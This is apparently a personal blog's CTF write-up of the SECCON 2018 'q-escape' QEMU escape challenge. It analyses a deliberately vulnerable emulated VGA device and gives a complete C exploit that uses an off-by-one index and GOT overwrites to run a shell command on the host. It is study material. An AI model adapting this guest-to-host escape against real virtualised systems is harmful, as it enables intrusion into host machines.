---
layout: post
title: seccon 2018 - q-escape
category: [Exploitation]
tags: [Exploitation, seccon]
comments: true
hidden: false
---

Just like [babyqemu]({{site.url}}/exploitation/2018/11/22/Hitb-2017-babyqemu.html) and [SCSI]({{site.url}}/exploitation/2018/11/22/RealworldCTF-2018-SCSI.html) I did not play this ctf and probably wouldn't have been able to complete this challenge in time even if I did. Me and a couple teammates did these as exercise and I wanted to document the methods and analysis.

> [q-escape.tar.gz]({{site.url}}/assets/q-escape.tar.gz)

## Summary

Exploitation of this challenge is easy, if you know how to do VGA programming or simply interacting with VGA Memory IO and Ports IO, and apparently as [vakzz explained in his blog post](https://devcraft.io/2018/11/22/q-escape-seccon-2018.html), the binary running on the CTF server was different from the one given to the contestants. This time the vulnerable PCI Device is an VGA Device. We are given the ability to allocate memory and read/write from it, however we can allocate one more element than we are supposed to by taking advantage of a off-by-one in the allocation loop. That additional element it just so happens it overlaps with a property (&latch[0]) of the VGAState that we control, thus giving us the ability to control a pointer we can read from and write to.

## Analysis

The device is initialized with the `-device cydf-vga` flag, so looking for `cydf_vga` in the Functions subview in IDA will show us all of the associated functions. Because the device is enormous I will only show the part to control the vulnerable part. We can find it by looking for the hinting `vulncnt` global variable and it's xrefs.

{% highlight C %}
typedef struct _CydfVGAState {
    //...
    VulnState vs[16];
    uint32_t latch[4];
    //...
} CydfVGAState;

typedef struct _VulnState {
    char* buf;
    uint32_t max_size;
    uint32_t cur_size;
} VulnState;

int vulncnt = 0;

void cydf_vga_mem_write( CydfVGAState* dev, hwaddr addr, uint64_t mem_value, uint32_t size )
{
    if ( !( dev->vga.sr[7] & 1 ) ) {
        vga_mem_writeb( &dev->vga, addr, mem_value );
        return;
    }
    if ( addr <= 0xFFFF ) {
        // useless
    }
    if ( addr - 0x18000 <= 0xFF ) {
        // useless
    } else {
        // We can reach here by enabling sr[7] and accessing mmio 0xb0000
        // sr[0xcc] holds switch var/command
        char cmd = dev->vga.sr[0xCC];

        // high order uint16_t held in sr[0xce]
        // low order uint16_t passed as argument
        if ( dev->vga.sr[0xCD] || dev->vga.sr[0xCE] )
            mem_value = ( dev->vga.sr[0xCE] << 8 ) | mem_value;

        // VulnState index held in sr[0xCD]
        unsigned int idx = dev->vga.sr[0xCD];
        if ( idx > 16 ) {
            return;
        }

        // I changed this for readability
        switch ( cmd ) {
            case 0:
                // malloc buf
                if ( vulncnt <= 16 && mem_value <= 0x1000 ) {
                    char* buf = malloc( mem_value );
                    dev->vs[vulncnt].buf = buf;
                    if ( buf ) {
                        dev->vs[vulncnt].max_size = mem_value;
                        vulncnt++;
                    }
                }

            case 1: {
                // write byte
                char* buf = dev->vs[idx].buf;
                if ( !buf )
                    return;
                unsigned int cur_size = dev->vs[idx].cur_size;
                if ( cur_size >= dev->vs[idx].max_size )
                    return;
                dev->vs[idx].cur_size = cur_size + 1;
                buf[cur_size] = mem_value;
            }

            case 2: {
                // print buf
                // fsb here, but we dont need it
                char* buf = dev->vs[idx].buf;
                if ( buf )
                    __printf_chk( 1, buf );
            }

            case 3: {
                // set max_size
                if ( dev->vs[idx].buf ) {
                    if ( mem_value <= 0x1000 )
                        dev->vs[idx].max_size = mem_value;
                }
            }

            case 4: {
                // write byte - bof
                char* buf = dev->vs[idx].buf;
                if ( !buf )
                    return;
                unsigned int cur_size = dev->vs[idx].cur_size;
                if ( cur_size > 0xFFF )
                    return;
                dev->vs[idx].cur_size++;
                buf[cur_size] = mem_value;
            }
        }
    }
}
{% endhighlight %}

Reaching the vulnerable part of the code it all depends on controlling the emulated SR register. We can do that by using port IO [previous article]({{site.url}}/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html) or simply use `cydf_mmio_write`.

{% highlight C %}
void cydf_mmio_write(CydfVGAState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  if ( addr > 0xFF )
    // useless
    cydf_mmio_blt_write(opaque, addr - 0x100, val);
  else
    // this gives us the ability to control SR and GR VGA registers
    // addr param is the port IO we want to write to
    cydf_vga_ioport_write(opaque, addr + 0x10, val, size);
}
{% endhighlight %}

I'm not gonna lie, it took me a while trying to understand [some VGA programming](http://www.osdever.net/FreeVGA/home.htm) but I decided to just move on as it's too much useless information for me.

Now let's see how `cydf_mmio_read/write` and `cydf_vga_mem_read/write` differ.

By listing the PCI Devices and memory IO via `/proc/iomem` and following the `_realize` callback (and `cydf_init_common`) we can determine that memory for VGA emulation is allocated as [described](http://www.osdever.net/FreeVGA/vga/vgamem.htm) at `0xA0000` and memory IO on the PCI Bus at `0xfebc1000`.

{% highlight bash %}
/ # lspci
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 0300: 1013:00b8
/ # cat /proc/iomem
00000000-00000fff : Reserved
00001000-0009fbff : System RAM
0009fc00-0009ffff : Reserved
000a0000-000bffff : PCI Bus 0000:00
000c0000-000c97ff : Video ROM
000c9800-000ca5ff : Adapter ROM
000ca800-000cadff : Adapter ROM
000f0000-000fffff : Reserved
  000f0000-000fffff : System ROM
00100000-03fdffff : System RAM
  01000000-01c031d0 : Kernel code
  01c031d1-0266a03f : Kernel data
  028e2000-02b3dfff : Kernel bss
03fe0000-03ffffff : Reserved
04000000-febfffff : PCI Bus 0000:00
  fa000000-fbffffff : 0000:00:04.0
  fc000000-fcffffff : 0000:00:02.0
  feb40000-feb7ffff : 0000:00:03.0
  feb80000-feb9ffff : 0000:00:03.0
  febb0000-febbffff : 0000:00:04.0
  febc0000-febc0fff : 0000:00:02.0
  febc1000-febc1fff : 0000:00:04.0
fec00000-fec003ff : IOAPIC 0
fed00000-fed003ff : HPET 0
  fed00000-fed003ff : PNP0103:00
fee00000-fee00fff : Local APIC
fffc0000-ffffffff : Reserved
100000000-17fffffff : PCI Bus 0000:00
/ # cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
0x00000000fa000000 0x00000000fbffffff 0x0000000000042208
0x00000000febc1000 0x00000000febc1fff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x00000000febb0000 0x00000000febbffff 0x0000000000046200
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
{% endhighlight %}

The above explanation might be a little confusing and that's because some of it is based on guessing and assumptions. This article is really not that informative but it's just a way for me to keep notes about stuff I plan to flush out of my brain ASAP.

So, accessing physical memory `0xA0000` is handled by `cydf_vga_mem_read/write` (which controls the vuln code) and accessing memory `0xfebc1000` is handled by `cydf_mem_read/write` callbacks (which controls the VGA registers by emulating the port IO, this can also be achieved by directly accessing the port IO with `sys/io.h` macros).

## Exploit

I think I will explain this part via comments, it would be easier this way.

{% highlight C %}
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

size_t mmio_addr = 0xfebc1000;
size_t mmio_size = 0x1000;
size_t vga_addr = 0xa0000;
size_t vga_size = 0x20000;

unsigned char* mmio_ptr = 0;
unsigned char* vga_ptr = 0;

void* mapmem( const char* dev, size_t offset, size_t size )
{
    int fd = open( dev, O_RDWR | O_SYNC );
    if ( fd == -1 ) {
        return 0;
    }

    void* result = mmap( NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );

    if ( !result ) {
        return 0;
    }

    close( fd );
    return result;
}

unsigned char vga_mem_read( unsigned int addr )
{
    return vga_ptr[addr];
}

void vga_mem_write( unsigned int addr, unsigned char val )
{
    vga_ptr[addr] = val;
}

void SR( unsigned char index, unsigned char val )
{
    mmio_ptr[4] = index;
    mmio_ptr[5] = val;
}

int main( void )
{
    // /dev/mem is not mapped on the system
    // we need to do that (man mem)
    system( "mknod -m 660 /dev/mem c 1 1" );

    mmio_ptr = mapmem( "/dev/mem", mmio_addr, mmio_size );
    if ( !mmio_ptr ) {
        return 1;
    }

    vga_ptr = mapmem( "/dev/mem", vga_addr, vga_size );
    if ( !vga_ptr ) {
        return 2;
    }

    unsigned char payload[64] = { 0 };
    strcpy( payload, "cat flag" );

    /*
        BUG out of bound VulnState index in cydf_vga_mem_write
        vulncnt <= 16

        - Vuln commands:
            0. malloc
            1. write with limit of max_size
            2. print content of vs[index].buf
            3. set new max_size for vs
            4. write past the max_size limit, bof
        
        vs[16] as its out of bounds overlaps with VGACommonState.latch
        - use vga_mem_read to write over the latch thus creating a pointer for vs[16]
        - use vs command 1 to write over the vs[16].buf that we placed there
        - with the above mechanism we have arbitrary write use it to:
            - write string "cat flag" in the qemu's bss
            - write the pointer to our string in global "qemu_logfile"
            - overwrite the vfprintf@GOT with system@PLT
            - overwrite the __printf_chk@GOT with address of "qemu_log" function


    */

    // Set the latch[0] to 0xf6a3c0
    // this is just a random .bss address
    // that we are going to use as tmp buffer
    vga_mem_read( 1 );
    vga_mem_read( ( 0xf6a3c0 >> 16 ) );
    vga_mem_read( 0xf6a3c0 & 0xffff );

    // Set the first bit of sr[7] so we can reach the vuln
    SR( 7, 1 );
    // set cmd to write with no limit
    SR( 0xcc, 4 );
    // set the VulnState index to 16
    // this will ensure that latch[0] is now the buffer in use
    SR( 0xcd, 16 );

    // copy the "cat flag" string to dst buffer
    // pointed to by dev->vs[16].buf, aka latch[0]
    for ( int i = 0; i < 8; i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }

    *(size_t*)&payload[0] = 0xf6a3c0;

    // change latch[0] to 0x10CCBE0, so 0x10CCBE0 is our new dst buf
    vga_mem_read( ( 0x10CCBE0 - 8 >> 16 ) );
    vga_mem_read( 0x10CCBE0 - 8 & 0xffff );

    // write 0xf6a3c0 at 0x10CCBE0
    // 0x10CCBE0 is just a global used as first argument for the vfprintf
    // function in qemu_log
    // so now the first argument for vfprintf from inside qemu_log is char* "cat flag"
    for ( int i = 0; i < sizeof( size_t ); i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }

    *(size_t*)&payload[0] = 0x409DD0;
    // change latch[0] to 0xee7bb0, which is vfprintf@GOT
    vga_mem_read( ( 0xee7bb0 - 0x10 >> 16 ) );
    vga_mem_read( 0xee7bb0 - 0x10 & 0xffff );

    // overwrite vfprintf@GOT with system@PLT (0x409DD0)
    for ( int i = 0; i < sizeof( size_t ); i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }

    *(size_t*)&payload[0] = 0x9726E8;
    // set latch[0] to 0xee7028, which is __printf_chk@GOT
    vga_mem_read( ( 0xee7028 - 0x18 >> 16 ) );
    vga_mem_read( 0xee7028 - 0x18 & 0xffff );

    // overwrite __printf_chk@GOT with addr of qemu_log (0x9726E8)
    for ( int i = 0; i < sizeof( size_t ); i++ ) {
        vga_mem_write( 0x10000, payload[i] );
    }

    // set the command to trigger the __printf_chk
    SR( 0xcc, 2 );

    // call the __printf_chk@GOT which is now qemu_log
    // qemu_log executes vfprintf@GOT which is now system@PLT
    // it uses our string "cat flag" as argument
    vga_mem_write( 0x10000, 0 );

    return 0;
}
{% endhighlight %}

{% highlight bash %}
[q-escape] musl-gcc -s -static -o pwn-min pwn-min.c && echo pwn-min | cpio -A -H newc -ov -F initramfs.cpio
pwn-min
20 blocks
[q-escape] ls -la pwn-min
-rwxr-xr-x 1 vagrant vagrant 9168 Nov 29 21:28 pwn-min
[q-escape]
[q-escape] ./run.sh
SeaBIOS (version rel-1.11.2-0-gf9626ccb91-prebuilt.qemu-project.org)
iPXE (http://ipxe.org) 00:03.0 C980 PCI2.10 PnP PMM+03F91380+03EF1380 C980
Booting from ROM..
...
Boot took 7.49 seconds
/bin/sh: cant access tty; job control turned off
/ # /pwn-min
flagflagflag===FLAGFLAGFLAG
/ #
{% endhighlight %}

